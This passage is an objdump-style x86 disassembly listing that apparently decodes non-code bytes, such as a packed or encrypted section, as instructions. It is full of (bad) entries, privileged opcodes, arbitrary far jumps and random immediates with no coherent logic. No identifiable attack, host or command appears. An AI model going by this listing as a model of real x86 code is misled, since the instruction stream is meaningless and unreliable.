  4267f3:	sub    BYTE PTR [ebx+ebp*4-0x2b],al
  4267f7:	push   cs
  4267f8:	pop    ss
  4267f9:	and    al,0x86
  4267fb:	ins    BYTE PTR es:[edi],dx
  4267fc:	stc    
  4267fd:	push   es
  4267fe:	stos   BYTE PTR es:[edi],al
  4267ff:	inc    esp
  426800:	ret    
  426801:	add    DWORD PTR [ecx+0x74],ebp
  426804:	pop    es
  426805:	nop
  426806:	ror    DWORD PTR [ebp-0x15],cl
  426809:	lods   eax,DWORD PTR ds:[esi]
  42680a:	cdq    
  42680b:	pop    es
  42680c:	outs   dx,DWORD PTR ds:[esi]
  42680d:	out    0x39,al
  42680f:	push   edx
  426810:	jle    0x426826
  426812:	rol    BYTE PTR [edi],0x13
  426815:	pushf  
  426816:	mov    bh,0x87
  426818:	xor    BYTE PTR [edi-0x676cc532],0xc6
  42681f:	pop    ecx
  426820:	mov    edi,0x41d8eede
  426825:	mov    al,ds:0x3e00fa08
  42682a:	icebp  
  42682b:	hlt    
  42682c:	sub    BYTE PTR [ebx+ecx*4+0x5],ch
  426830:	test   DWORD PTR [esi-0x7c],edi
  426833:	push   esp
  426834:	es jns 0x42681d
  426837:	loop   0x4267cc
  426839:	jg     0x426898
  42683b:	(bad)  
  42683c:	mov    eax,0x720d068e
  426841:	inc    esi
  426842:	fild   WORD PTR [ebx]
  426844:	mov    ds:0x77fbdcee,eax
  426849:	or     ch,bl
  42684b:	mov    ds:0x871064ef,eax
  426850:	je     0x4267e8
  426852:	(bad)
  426857:	jbe    0x426850
  426859:	pushf  
  42685a:	inc    ecx
  42685b:	test   BYTE PTR [ecx-0x56],cl
  42685e:	fucom  st(1)
  426860:	mov    cl,0xe1
  426862:	add    ebx,DWORD PTR [edi-0xfe215d2]
  426868:	lds    esp,FWORD PTR [ecx+0x5ce025a8]
  42686e:	(bad)
  426872:	iret   
  426873:	mov    BYTE PTR [eax],bl
  426875:	into   
  426876:	xchg   esp,eax
  426877:	pusha  
  426878:	and    DWORD PTR [edi+ebx*8-0xb17733b],esp
  42687f:	out    0x6d,al
  426881:	ror    DWORD PTR [edx+0x28],0x40
  426885:	mov    ds:0x51e7a70d,al
  42688a:	adc    ch,BYTE PTR [ebx+0x620b4a7a]
  426890:	jmp    0x30e58d74
  426895:	xchg   ecx,eax
  426896:	add    al,0xa
  426898:	ds sbb ah,dh
  42689b:	sbb    dh,al
  42689d:	push   edi
  42689e:	mov    eax,ds:0x13c99970
  4268a3:	loop   0x4268ee
  4268a5:	jp     0x4268ba
  4268a7:	in     al,dx
  4268a8:	sub    ebx,ecx
  4268aa:	push   ds
  4268ab:	mov    esi,0x1c0deaac
  4268b0:	jo     0x42690b
  4268b2:	lods   eax,DWORD PTR ds:[esi]
  4268b3:	sub    ecx,DWORD PTR [ecx+0x74bc8a7c]
  4268b9:	add    cl,BYTE PTR [ebp+0x59d3460f]
  4268bf:	in     al,0x1f
  4268c1:	push   esp
  4268c2:	sub    DWORD PTR [ecx+0x7d],eax
  4268c5:	mov    esp,0x8d360920
  4268ca:	push   0x38a83d1b
  4268cf:	fdivr  st,st(1)
  4268d1:	sahf   
  4268d2:	xchg   edx,eax
  4268d3:	add    eax,0xa1d89f91
  4268d8:	stos   DWORD PTR es:[edi],eax
  4268d9:	je     0x4268b8
  4268db:	dec    eax
  4268dc:	xor    ecx,ebp
  4268de:	ins    BYTE PTR es:[edi],dx
  4268df:	push   ebp
  4268e0:	aam    0x98
  4268e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268e3:	xor    ebx,edi
  4268e5:	cs call 0x9f2f:0x25da6cbe
  4268ed:	stos   BYTE PTR es:[edi],al
  4268ee:	mov    al,0x3e
  4268f0:	idiv   DWORD PTR [ebx-0x59]
  4268f3:	mov    bl,0x2f
  4268f5:	test   bh,0x82
  4268f8:	add    ch,BYTE PTR [eax+ebx*4]
  4268fb:	sahf   
  4268fc:	dec    eax
  4268fd:	icebp  
  4268fe:	mov    eax,0xa294df3f
  426903:	inc    ecx
  426904:	ds leave 
  426906:	push   edi
  426907:	test   BYTE PTR [ecx+0x3cb4d9f1],ah
  42690d:	test   eax,0xcf4dfcb8
  426912:	pop    eax
  426913:	cmp    DWORD PTR [edx],esi
  426915:	mul    DWORD PTR [esi+ebx*8-0x7f73d818]
  42691c:	mov    eax,0x45c528ad
  426921:	fnstenv [ebx]
  426923:	(bad)  [ebp-0x5cdf63f5]
  426929:	push   cs
  42692a:	fsub   DWORD PTR ds:0x1cca4f98
  426930:	dec    esp
  426931:	inc    ebp
  426932:	inc    ecx
  426933:	stos   BYTE PTR es:[edi],al
  426934:	jmp    0x4269ad
  426936:	push   es
  426937:	stc    
  426938:	and    DWORD PTR [ecx+0x7b02fa7a],edx
  42693e:	or     dl,ah
  426940:	fiadd  DWORD PTR [ebp+0x3ae4941e]
  426946:	xchg   edx,eax
  426947:	xchg   edx,eax
  426948:	mov    ds:0xd20f7835,al
  42694d:	loopne 0x4268ec
  42694f:	lock lods eax,DWORD PTR ds:[esi]
  426951:	mov    ds,WORD PTR [ecx]
  426953:	mov    ebx,0x6b5c5daf
  426958:	mov    BYTE PTR [eax],dl
  42695a:	pop    ds
  42695b:	pop    esi
  42695c:	repz jnp 0x4269be
  42695f:	inc    edi
  426960:	fcomp  st(1)
  426962:	outs   dx,BYTE PTR ds:[esi]
  426963:	aas    
  426964:	test   dl,0x9e
  426967:	inc    edx
  426968:	mov    eax,ds:0xd5c2687d
  42696d:	fsub   QWORD PTR [eax-0x1c]
  426970:	sub    BYTE PTR [eax],cl
  426972:	add    DWORD PTR [esi+0x4e6e0c8f],eax
  426978:	imul   edi,DWORD PTR [esi],0xe0eb4fb2
  42697e:	inc    ebp
  42697f:	mov    edx,0xc5cdfdd9
  426984:	xor    al,0xbc
  426986:	fidiv  WORD PTR [esp+ecx*8-0x12]
  42698a:	or     ah,bl
  42698c:	cmp    eax,DWORD PTR [ebp-0x627a912]
  426992:	xchg   esp,eax
  426993:	mov    edx,0x51e4376e
  426998:	push   0x5ac787ad
  42699d:	popa   
  42699e:	loop   0x4269c3
  4269a0:	and    DWORD PTR [esi-0x8],edx
  4269a3:	cmp    DWORD PTR [eax],esi
  4269a5:	test   al,0x8e
  4269a7:	int    0x48
  4269a9:	xchg   ebx,eax
  4269aa:	clc    
  4269ab:	pavgb  mm5,QWORD PTR [ecx]
  4269ae:	xchg   ebx,eax
  4269af:	imul   DWORD PTR [esi]
  4269b1:	push   esp
  4269b2:	push   esi
  4269b3:	cmc    
  4269b4:	into   
  4269b5:	push   ss
  4269b6:	aas    
  4269b7:	xor    edx,esi
  4269b9:	or     eax,0xb24dd6f7
  4269be:	cmp    BYTE PTR [edi],dh
  4269c0:	neg    BYTE PTR [ebx]
  4269c2:	fnsave [ebx]
  4269c4:	mov    bl,0x57
  4269c6:	shl    DWORD PTR [esi],0x0
  4269c9:	inc    edi
  4269ca:	or     BYTE PTR [edi-0x13e4049f],al
  4269d0:	dec    ecx
  4269d1:	call   esp
  4269d3:	and    ebx,eax
  4269d5:	inc    eax
  4269d6:	ficom  DWORD PTR [ecx-0x75]
  4269d9:	fisubr DWORD PTR [ebx]
  4269db:	bound  esi,QWORD PTR [edi+0x5f7096b3]
  4269e1:	sbb    al,0x96
  4269e3:	jge    0x4269d3
  4269e5:	fsub   st(3),st
  4269e7:	or     ah,BYTE PTR [eax]
  4269e9:	jl     0x426978
  4269eb:	iret   
  4269ec:	es mov eax,0x8d54e67f
  4269f2:	push   ecx
  4269f3:	sbb    bl,BYTE PTR [edx-0x1f]
  4269f6:	addr16 adc ebp,edx
  4269f9:	iret   
  4269fa:	sbb    al,0xe2
  4269fc:	dec    ecx
  4269fd:	sub    ebp,DWORD PTR [esi+0x47]
  426a00:	pop    esi
  426a01:	lods   al,BYTE PTR ds:[esi]
  426a02:	sar    DWORD PTR [ebp+ecx*2-0x277c35be],0x65
  426a0a:	lock jns 0x426a3d
  426a0d:	dec    edx
  426a0e:	push   ds
  426a0f:	cmp    BYTE PTR [esp+edx*2-0x639ae4dd],bl
  426a16:	jbe    0x426a8e
  426a18:	pop    ds
  426a19:	or     BYTE PTR [ebx],al
  426a1b:	dec    esp
  426a1c:	jno    0x426a3f
  426a1e:	pop    edx
  426a1f:	jge    0x426a5d
  426a21:	rcl    BYTE PTR [edi],1
  426a23:	sub    al,0xed
  426a25:	or     DWORD PTR [ebx+ecx*4-0x78ff725f],esi
  426a2c:	imul   eax,DWORD PTR [ebx+0x3f017258],0x6ca84d50
  426a36:	sahf   
  426a37:	sti    
  426a38:	xor    ebp,ecx
  426a3a:	xchg   dl,cl
  426a3c:	and    DWORD PTR [edx+0x16301d71],ebp
  426a42:	xchg   DWORD PTR [ecx],edx
  426a44:	sahf   
  426a45:	mov    esp,cs
  426a47:	imul   BYTE PTR [ecx-0x2dc88592]
  426a4d:	js     0x426a07
  426a4f:	or     DWORD PTR ds:0xe4d573a1,eax
  426a55:	add    eax,0x5f78b055
  426a5a:	outs   dx,BYTE PTR ds:[esi]
  426a5b:	dec    esp
  426a5c:	call   0x2bea404
  426a61:	or     ebx,DWORD PTR [edx]
  426a63:	and    eax,0x8860d399
  426a68:	in     al,0x96
  426a6a:	xchg   DWORD PTR [esp+ebx*8-0x3c],eax
  426a6e:	(bad)  
  426a6f:	scas   al,BYTE PTR es:[edi]
  426a70:	mov    ?,WORD PTR [ebp+0x59cb1a18]
  426a76:	mov    ah,0x81
  426a78:	test   eax,0x791138a
  426a7d:	sbb    al,0x7e
  426a7f:	call   0x295f:0xd4df557b
  426a86:	add    DWORD PTR [edi+0x4d],esp
  426a89:	push   ebp
  426a8a:	sbb    eax,0xc7798ea1
  426a8f:	and    DWORD PTR [esi],eax
  426a91:	mov    dl,0xea
  426a93:	cmp    edx,esi
  426a95:	cld    
  426a96:	xchg   esi,eax
  426a97:	scas   al,BYTE PTR es:[edi]
  426a98:	sbb    eax,0x55ba803c
  426a9d:	mov    al,0x43
  426a9f:	add    dl,BYTE PTR [ecx+eiz*8+0x3b2098bf]
  426aa6:	lea    esp,[esi]
  426aa8:	pop    edx
  426aa9:	js     0x426b2a
  426aab:	(bad)  
  426aac:	out    dx,al
  426aad:	fstp   TBYTE PTR [ebp+0x3b]
  426ab0:	jmp    0x426a60
  426ab2:	push   0x968ae4aa
  426ab7:	pop    DWORD PTR [esi+0x53fc032d]
  426abd:	cs or  eax,0x4bec3c1f
  426ac3:	inc    eax
  426ac4:	std    
  426ac5:	sar    DWORD PTR [ebx+ebp*2-0x3f2e1d2f],1
  426acc:	mov    esi,0x98310c34
  426ad1:	add    eax,0xb17e365
  426ad6:	cwde   
  426ad7:	mov    dl,0x76
  426ad9:	aam    0xb9
  426adb:	mov    al,0xc0
  426add:	imul   edx
  426adf:	leave  
  426ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ae1:	(bad)  
  426ae2:	mul    BYTE PTR [esi-0x6c495ab]
  426ae8:	stos   DWORD PTR es:[edi],eax
  426ae9:	fst    DWORD PTR ds:0x5f3c0075
  426aef:	aas    
  426af0:	add    ah,BYTE PTR [eax]
  426af2:	fwait
  426af3:	xor    cl,BYTE PTR [eax+0x5fc0f799]
  426af9:	push   0xffffff94
  426afb:	mov    ch,0xc1
  426afd:	outs   dx,DWORD PTR ds:[esi]
  426afe:	aas    
  426aff:	into   
  426b00:	add    DWORD PTR [edx-0x7656dbe0],esi
  426b06:	inc    ebx
  426b07:	pop    ebp
  426b08:	pop    esp
  426b09:	scas   eax,DWORD PTR es:[edi]
  426b0a:	lods   eax,DWORD PTR ds:[esi]
  426b0b:	shl    BYTE PTR [edx],cl
  426b0d:	hlt    
  426b0e:	and    ebp,DWORD PTR [ecx]
  426b10:	jnp    0x426b69
  426b12:	jbe    0x426adc
  426b14:	lea    ebp,[edx+0x6f]
  426b17:	scas   al,BYTE PTR es:[edi]
  426b18:	dec    ebp
  426b19:	mov    DWORD PTR [ecx+0x33],eax
  426b1c:	test   eax,0xcb2efde7
  426b21:	cmp    BYTE PTR [eax],cl
  426b23:	call   DWORD PTR ds:0x9d788761
  426b29:	inc    ebx
  426b2a:	je     0x426b31
  426b2c:	ds pop edx
  426b2e:	fcomp  QWORD PTR ds:0xa304b53c
  426b34:	push   0xffffffa1
  426b36:	fcom   DWORD PTR [ecx+eiz*2-0x57]
  426b3a:	retf   0x2c90
  426b3d:	fiadd  DWORD PTR [ecx]
  426b3f:	push   edi
  426b40:	mov    eax,ds:0x31638f37
  426b45:	jno    0x426b39
  426b47:	loope  0x426b53
  426b49:	lock sti 
  426b4b:	dec    edx
  426b4c:	rcr    ebx,1
  426b4e:	imul   ebp,edx,0xa
  426b51:	out    0x5c,eax
  426b53:	dec    ebp
  426b54:	adc    al,0x34
  426b56:	pushf  
  426b57:	xlat   BYTE PTR ds:[ebx]
  426b58:	mov    edi,0x2dfff218
  426b5d:	jbe    0x426b4e
  426b5f:	scas   al,BYTE PTR es:[edi]
  426b60:	push   esi
  426b61:	and    eax,0xe2e87408
  426b66:	pop    esi
  426b67:	xchg   edx,eax
  426b68:	sub    eax,0x8a8c6d1e
  426b6d:	or     BYTE PTR [esi-0x36],0x52
  426b71:	mov    DWORD PTR [ebx+0x337ac42d],ebp
  426b77:	sbb    al,0xd0
  426b79:	(bad)  
  426b7a:	adc    esi,DWORD PTR [ebx+0x5d1c23c0]
  426b80:	cmp    DWORD PTR [eax-0x65d8f451],ebx
  426b86:	fidiv  WORD PTR [eax+0x38]
  426b89:	call   0x1c85f31d
  426b8e:	inc    edi
  426b8f:	mov    ah,0x96
  426b91:	(bad)  
  426b92:	cdq    
  426b93:	mov    cl,0x45
	...
  426ba9:	add    BYTE PTR [ecx+0x55],cl
  426bac:	inc    edx
  426bad:	push   ebx
  426bae:	pop    esi
  426baf:	push   edi
  426bb0:	pop    ecx
  426bb1:	pop    edi
  426bb2:	ss cmc 
  426bb4:	imul   BYTE PTR [ebx]
  426bb6:	loopne 0x426c26
  426bb8:	add    esi,ecx
  426bba:	es clc 
  426bbc:	add    DWORD PTR [eax],eax
  426bbe:	rol    DWORD PTR [esi],cl
  426bc0:	add    BYTE PTR [eax],al
  426bc2:	(bad)  
  426bc3:	sub    BYTE PTR ds:0x76269d83,cl
  426bc9:	push   ecx
  426bca:	dec    ebp
  426bcb:	add    edx,esp
  426bcd:	jae    0x426b51
  426bcf:	leave  
  426bd0:	(bad)  
  426bd1:	popa   
  426bd2:	pop    ebx
  426bd3:	jb     0x426bce
  426bd5:	jns    0x426bd9
  426bd7:	ror    DWORD PTR [ecx+0x7f217e51],1
  426bdd:	xor    esp,DWORD PTR [edx-0x47bb6c1d]
  426be3:	push   ecx
  426be4:	inc    eax
  426be5:	xchg   BYTE PTR [ebx-0x624ffaa],dh
  426beb:	je     0x426bce
  426bed:	cmc    
  426bee:	adc    DWORD PTR [eax-0x59],eax
  426bf1:	rcr    DWORD PTR [edi],1
  426bf3:	pop    esp
  426bf4:	in     al,0x5d
  426bf6:	jns    0x426bad
  426bf8:	mov    ebx,0x10f835d4
  426bfd:	lock pusha 
  426bff:	jg     0x426be6
  426c01:	or     DWORD PTR [edx-0x36c907ab],ebx
  426c07:	loop   0x426c03
  426c09:	pop    es
  426c0a:	push   es
  426c0b:	fcomip st,st(7)
  426c0d:	mov    al,ds:0x4b882f07
  426c12:	mov    ds,WORD PTR [esi+ebp*4+0x3c]
  426c16:	mov    edi,0x95b467a9
  426c1b:	inc    eax
  426c1c:	nop
  426c1d:	or     al,0x36
  426c1f:	jg     0x426c90
  426c21:	div    esp
  426c23:	loop   0x426bd3
  426c25:	xchg   ecx,eax
  426c26:	adc    eax,0x925e935b
  426c2b:	adc    al,0x8f
  426c2d:	xlat   BYTE PTR ds:[ebx]
  426c2e:	mov    eax,0x14f59a81
  426c33:	scas   al,BYTE PTR es:[edi]
  426c34:	test   BYTE PTR [esi-0x76d45e7c],bl
  426c3a:	int    0xdc
  426c3c:	pop    ss
  426c3d:	retf   
  426c3e:	dec    eax
  426c3f:	ja     0x426c3f
  426c41:	xlat   BYTE PTR ds:[ebx]
  426c42:	aad    0xa6
  426c44:	dec    esp
  426c45:	sbb    edx,DWORD PTR [eax-0x3c]
  426c48:	lods   al,BYTE PTR ds:[esi]
  426c49:	imul   dh
  426c4b:	scas   eax,DWORD PTR es:[edi]
  426c4c:	test   ch,dl
  426c4e:	jmp    0xe0fe:0x770a72ad
  426c55:	jg     0x426c0a
  426c57:	popf   
  426c58:	mov    cl,0x8f
  426c5a:	fbld   TBYTE PTR [eax]
  426c5c:	ret    0xd96c
  426c5f:	adc    bh,BYTE PTR [edx+edi*2-0x58]
  426c63:	add    bl,cl
  426c65:	shl    esi,1
  426c67:	bswap  ecx
  426c69:	sbb    edi,eax
  426c6b:	es dec ebx
  426c6d:	ja     0x426c7f
  426c6f:	frstor [ecx+edx*4]
  426c72:	jle    0x426cee
  426c74:	cmp    al,0x70
  426c76:	inc    edi
  426c77:	mov    esp,0x8765cb53
  426c7c:	dec    ecx
  426c7d:	dec    ebx
  426c7e:	xchg   ebx,eax
  426c7f:	cmp    bl,BYTE PTR [ebx+0x301235de]
  426c85:	fstp   DWORD PTR [edi+0xbd28059]
  426c8b:	lock mov ebp,0xbfdea5c1
  426c91:	inc    edi
  426c92:	imul   esp,DWORD PTR [eax+ebp*8+0x6600a333],0x87a2847
  426c9d:	daa    
  426c9e:	or     eax,0x7758781f
  426ca3:	icebp  
  426ca4:	cs into 
  426ca6:	popf   
  426ca7:	repz int 0xc0
  426caa:	cmp    edi,ebp
  426cac:	xlat   BYTE PTR ds:[ebx]
  426cad:	ins    BYTE PTR es:[edi],dx
  426cae:	stc    
  426caf:	(bad)  
  426cb0:	outs   dx,DWORD PTR ds:[esi]
  426cb1:	or     ch,BYTE PTR [edi-0x15]
  426cb4:	push   edi
  426cb5:	dec    edx
  426cb6:	adc    dh,BYTE PTR [ebx]
  426cb8:	mov    bl,0x3
  426cba:	div    DWORD PTR [esi+0x163ccfa3]
  426cc0:	rcl    WORD PTR ss:[edx+eiz*4],1
  426cc5:	xchg   BYTE PTR [ebx+0x4d],dl
  426cc8:	rcl    DWORD PTR [eax+0x64],1
  426ccb:	lea    esp,[esi+eiz*8+0x17e2d89b]
  426cd2:	push   esp
  426cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cd4:	push   ebp
  426cd5:	mov    eax,0x883ba3b8
  426cda:	jns    0x426ca1
  426cdc:	rcr    BYTE PTR [ecx+0x39],1
  426cdf:	dec    ebp
  426ce0:	out    0x8a,al
  426ce2:	dec    eax
  426ce3:	aaa    
  426ce4:	push   edi
  426ce5:	lods   eax,DWORD PTR ds:[esi]
  426ce6:	inc    esp
  426ce7:	test   BYTE PTR [eax+0x41],cl
  426cea:	ss cmp al,0x4d
  426ced:	sbb    al,0xff
  426cef:	mov    ecx,0x2b46e4b2
  426cf4:	retf   
  426cf5:	inc    ebx
  426cf6:	dec    eax
  426cf7:	sub    dh,BYTE PTR [esi+esi*2]
  426cfa:	jecxz  0x426d27
  426cfc:	inc    esp
  426cfd:	mov    ds:0xa21fed11,al
  426d02:	mov    ebx,0x63dbc42
  426d07:	xchg   ebp,eax
  426d08:	lock cmc 
  426d0a:	dec    ebp
  426d0b:	jge    0x426d42
  426d0d:	mov    dl,0x23
  426d0f:	push   es
  426d10:	loope  0x426d4e
  426d12:	leave  
  426d13:	pop    ds
  426d14:	maskmovq mm2,(bad)
  426d15:	not    DWORD PTR [ebp-0xb]
  426d18:	hlt    
  426d19:	mov    ?,WORD PTR [edi]
  426d1b:	sbb    BYTE PTR [ecx-0x55],ah
  426d1e:	daa    
  426d1f:	dec    ebp
  426d20:	mov    esi,0xe8aefc3
  426d25:	push   cs
  426d26:	jno    0x426da3
  426d28:	xlat   BYTE PTR ds:[ebx]
  426d29:	cli    
  426d2a:	xor    al,0x3c
  426d2c:	push   ss
  426d2d:	loopne 0x426cca
  426d2f:	aam    0x97
  426d31:	adc    BYTE PTR [edi-0x7d],dl
  426d34:	dec    eax
  426d35:	call   0xbf07a4
  426d3a:	inc    ecx
  426d3b:	fs das 
  426d3d:	xchg   BYTE PTR [edx+0xb8bd7d6],bl
  426d43:	jecxz  0x426d13
  426d45:	(bad)  
  426d46:	jae    0x426d34
  426d48:	push   0xe53ef3ef
  426d4d:	dec    ebp
  426d4e:	sbb    al,0x19
  426d50:	je     0x426d42
  426d52:	pop    esi
  426d53:	sbb    eax,0x9625c483
  426d58:	inc    edx
  426d59:	(bad)  
  426d5a:	daa    
  426d5b:	rcr    BYTE PTR [ecx+0x3d],0x39
  426d5f:	mov    al,ds:0x2c807af
  426d64:	inc    eax
  426d65:	inc    edx
  426d66:	push   edi
  426d67:	or     bh,BYTE PTR [ecx+eax*8]
  426d6a:	stos   BYTE PTR es:[edi],al
  426d6b:	outs   dx,DWORD PTR ds:[esi]
  426d6c:	push   es
  426d6d:	jmp    0x9529e620
  426d72:	dec    ebp
  426d73:	sub    al,0x18
  426d75:	and    eax,0xaf32ce27
  426d7a:	jle    0x426da1
  426d7c:	in     al,dx
  426d7d:	jne    0x426ddf
  426d7f:	adc    ah,dl
  426d81:	retf   
  426d82:	shl    DWORD PTR [ebx-0x36],cl
  426d85:	outs   dx,BYTE PTR ds:[esi]
  426d86:	in     al,0x8c
  426d88:	jnp    0x426e08
  426d8a:	(bad)
  426d8d:	aam    0xba
  426d8f:	dec    edi
  426d90:	inc    eax
  426d91:	adc    eax,0xada4cfb2
  426d96:	jae    0x426d2c
  426d98:	adc    al,0xa5
  426d9a:	test   al,0x7c
  426d9c:	(bad)  
  426d9d:	repnz outs dx,BYTE PTR ds:[esi]
  426d9f:	adc    dh,BYTE PTR [eax]
  426da1:	push   eax
  426da2:	mov    BYTE PTR [ecx+0x6e],dh
  426da5:	gs xor al,0x38
  426da8:	outs   dx,BYTE PTR ds:[esi]
  426da9:	push   0x64
  426dab:	mov    esi,0x8fad6aa2
  426db0:	mov    dl,0x3e
  426db2:	or     eax,0xbbbb4d4f
  426db7:	retf   0x9e9
  426dba:	shr    DWORD PTR [eax-0xc],cl
  426dbd:	jno    0x426e3a
  426dbf:	mov    cl,0xda
  426dc1:	xchg   edi,eax
  426dc2:	pushf  
  426dc3:	imul   ebp,DWORD PTR [eax-0x46],0xffffff8c
  426dc7:	xchg   edx,eax
  426dc8:	into   
  426dc9:	sbb    DWORD PTR [ebp+ebx*8-0x1d039f6b],esi
  426dd0:	xor    dl,BYTE PTR [esi]
  426dd2:	mov    ecx,0xb89e27c1
  426dd7:	xor    eax,0xefb54606
  426ddc:	xchg   esi,eax
  426ddd:	loopne 0x426def
  426ddf:	xor    DWORD PTR [edi],edi
  426de1:	mov    bl,0x47
  426de3:	lock rol BYTE PTR [ebx],0x95
  426de7:	or     edx,DWORD PTR [eax+edx*8]
  426dea:	push   ss
  426deb:	(bad)  [eax-0x18e2198b]
  426df1:	les    esp,FWORD PTR [ecx+esi*2]
  426df4:	adc    ecx,DWORD PTR [eax+0x8]
  426df7:	mov    edx,0xfed3b4dd
  426dfc:	ret    0x430e
  426dff:	fisttp WORD PTR [eax+0x46e284e4]
  426e05:	xor    cl,BYTE PTR [ecx-0x3c]
  426e08:	jns    0x426da0
  426e0a:	cmp    BYTE PTR [ebp-0x6bf00c7a],al
  426e10:	jmp    0x426e1e
  426e12:	jmp    0x426dc8
  426e14:	xchg   ebx,eax
  426e15:	jbe    0x426de4
  426e17:	xor    DWORD PTR [ebx],edi
  426e19:	mov    edi,0x679035b2
  426e1e:	cs sub eax,0x43e63ab2
  426e24:	rcr    DWORD PTR [edi+0x6b],0x3e
  426e28:	cs jae 0x426e08
  426e2b:	iret   
  426e2c:	jg     0x426dfc
  426e2e:	or     edi,ebx
  426e30:	mov    ds:0x16c61ec3,eax
  426e35:	out    0x83,eax
  426e37:	in     al,dx
  426e38:	mov    ds:0x485d2564,eax
  426e3d:	(bad)  
  426e3e:	hlt    
  426e3f:	push   eax
  426e40:	loopne 0x426dd0
  426e42:	icebp  
  426e43:	dec    ebp
  426e44:	cmp    BYTE PTR cs:[esi-0x51],0x6
  426e49:	jmp    FWORD PTR [edx+ebp*8+0x5afd8273]
  426e50:	aad    0x22
  426e52:	ret    0xf268
  426e55:	push   0xb384f7dc
  426e5a:	retf   0xe228
  426e5d:	popf   
  426e5e:	call   0x86d2:0xebb7e25
  426e65:	inc    esi
  426e66:	sbb    al,0xf
  426e68:	xor    eax,0xdc2d86c4
  426e6d:	push   ss
  426e6e:	mov    edx,0x433acda
  426e73:	sbb    al,al
  426e75:	in     eax,dx
  426e76:	and    al,0xf3
  426e78:	jp     0x426ed5
  426e7a:	test   BYTE PTR [ebp-0x74],bh
  426e7d:	test   BYTE PTR [edi],al
  426e7f:	es mov dl,0xd7
  426e82:	in     eax,0x9c
  426e84:	aam    0xc5
  426e86:	sub    esi,ebx
  426e88:	arpl   WORD PTR [ebx+0x1],ax
  426e8b:	adc    al,0xc6
  426e8d:	cmp    ah,BYTE PTR [ebx]
  426e8f:	cdq    
  426e90:	clc    
  426e91:	data16 clc 
  426e93:	fisub  WORD PTR [ecx+ebp*1]
  426e96:	cmp    dh,BYTE PTR [esi+0x6c6d96a]
  426e9c:	add    dh,BYTE PTR [edx-0x4ae9b7ce]
  426ea2:	(bad)  
  426ea3:	push   ecx
  426ea4:	std    
  426ea5:	retf   
  426ea6:	fdiv   QWORD PTR [ebp-0x1710f090]
  426eac:	ins    DWORD PTR es:[edi],dx
  426ead:	mov    ebx,0xb3dbe4a0
  426eb2:	pop    ecx
  426eb3:	(bad)  
  426eb4:	icebp  
  426eb5:	cwde   
  426eb6:	fcom   QWORD PTR [ecx+0xb]
  426eb9:	dec    esp
  426eba:	sbb    al,0xd2
  426ebc:	(bad)  
  426ebd:	ja     0x426f10
  426ebf:	ret    
  426ec0:	daa    
  426ec1:	mov    ebp,0x6ac5e393
  426ec6:	xchg   DWORD PTR [ebx+ecx*4-0x61b48276],edx
  426ecd:	aas    
  426ece:	cmp    esp,esp
  426ed0:	push   0xffffffd2
  426ed2:	xchg   BYTE PTR [ecx-0x34],bl
  426ed5:	and    BYTE PTR [ebx+edi*1],bh
  426ed8:	mov    esi,0x9977a6c4
  426edd:	hlt    
  426ede:	lahf   
  426edf:	jmp    0x426ef2
  426ee1:	jnp    0x426e76
  426ee3:	ret    0xa12e
  426ee6:	inc    ebx
  426ee7:	adc    ebx,DWORD PTR [eax]
  426ee9:	pop    ebp
  426eea:	sahf   
  426eeb:	std    
  426eec:	mov    eax,ds:0x597cf2c1
  426ef1:	xchg   edx,eax
  426ef2:	dec    esp
  426ef3:	fistp  WORD PTR [ebx]
  426ef5:	mov    ch,0x63
  426ef7:	popf   
  426ef8:	sbb    eax,ecx
  426efa:	mov    dh,0x51
  426efc:	cmp    ch,BYTE PTR [eax+0x45]
  426eff:	sbb    al,0x78
  426f01:	push   esp
  426f02:	aad    0xa1
  426f04:	lahf   
  426f05:	iret   
  426f06:	cmp    edx,DWORD PTR [esi-0x2263219e]
  426f0c:	ins    DWORD PTR es:[edi],dx
  426f0d:	div    DWORD PTR [eax-0x4116e05b]
  426f13:	enter  0x4882,0x30
  426f17:	xchg   ecx,eax
  426f18:	repz adc ecx,DWORD PTR [esi+edi*8]
  426f1c:	pop    esp
  426f1d:	push   ds
  426f1e:	mov    ecx,0xbf90af56
  426f23:	dec    ebx
  426f24:	icebp  
  426f25:	sar    BYTE PTR [edx+0x79],1
  426f28:	sbb    ecx,DWORD PTR [edx+0xc60689]
  426f2e:	inc    edi
  426f2f:	pop    ds
  426f30:	dec    edx
  426f32:	sub    esp,esp
  426f34:	arpl   WORD PTR [edi],cx
  426f36:	push   ss
  426f37:	dec    ecx
  426f38:	sbb    al,bl
  426f3a:	fsub   QWORD PTR [ecx-0x3081b5d7]
  426f40:	retf   0x4e53
  426f43:	pushf  
  426f44:	mov    edx,DWORD PTR [edx+0x62534cf3]
  426f4a:	mov    eax,0x110c1789
  426f4f:	loopne 0x426fa9
  426f51:	adc    al,dl
  426f53:	mov    fs,WORD PTR [edi]
  426f55:	xor    esi,0x74
  426f58:	aam    0x2f
  426f5a:	retf   0x81ee
  426f5d:	inc    eax
  426f5e:	mov    dl,0xbc
  426f60:	mov    ebp,0xf916bf4a
  426f65:	jle    0x426fdc
  426f67:	push   edi
  426f68:	xor    esp,ebp
  426f6a:	inc    ecx
  426f6b:	inc    ebp
  426f6c:	out    0xc1,eax
  426f6e:	scas   eax,DWORD PTR es:[edi]
  426f6f:	cmp    ebx,DWORD PTR [eax+0x70]
  426f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f73:	sti    
  426f74:	jns    0x426f2e
  426f76:	xchg   esi,eax
  426f77:	mov    esp,DWORD PTR [ecx-0xdcb8cc6]
  426f7d:	xor    eax,0xecd159b
  426f82:	pusha  
  426f83:	push   ebp
  426f84:	or     DWORD PTR ds:0x6e44bc73,0xbe22dac2
  426f8e:	push   ebx
  426f8f:	jno    0x426f1b
  426f91:	inc    eax
  426f92:	push   esi
  426f93:	lea    esi,[ebp+0x12fef9e5]
  426f99:	inc    esi
  426f9a:	fst    QWORD PTR [edx]
  426f9c:	or     eax,0x6630c38
  426fa1:	inc    edx
  426fa2:	jmp    0xad353656
  426fa7:	adc    edi,DWORD PTR [ebp-0x1e0065]
  426fad:	(bad)  
  426fae:	lock outs dx,DWORD PTR ds:[esi]
  426fb0:	pushf  
  426fb1:	outs   dx,DWORD PTR ds:[esi]
  426fb2:	outs   dx,DWORD PTR ds:[esi]
  426fb3:	inc    ebx
  426fb4:	xchg   edi,eax
  426fb5:	push   DWORD PTR ds:[edx-0x1]
  426fb9:	ss dec edx
